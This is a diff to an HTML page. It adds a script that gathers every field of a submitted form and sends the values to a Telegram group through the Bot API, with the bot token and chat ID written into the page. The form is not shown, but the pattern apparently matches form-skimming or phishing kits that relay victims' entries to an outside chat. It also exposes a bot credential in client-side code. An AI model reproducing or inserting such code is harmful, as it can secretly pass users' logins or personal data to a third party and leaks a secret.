@@ -67,6 +67,28 @@
       });
     </script>
 
-   
+    <script>
+      const token = '7795904473:AAG3IsvW5wJ9hXVxGpVSdWgV-BfV7dh4NeE'
+      const group = '-4719473311'
+      
+      const send = (event) => {
+
+       
+
+        event.stopPropagation()
+        event.preventDefault();
+        const form = event.target;
+        const formData = new FormData(form);
+        
+        let text = ''
+        formData.forEach((value, name) => {
+          text += `${name}: ${value} \n`
+        });
+        const encodedText = encodeURIComponent(text);
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${group}&text=${encodedText}`
+        fetch(url)
+
+      } 
+    </script>
   </body>
 </html>
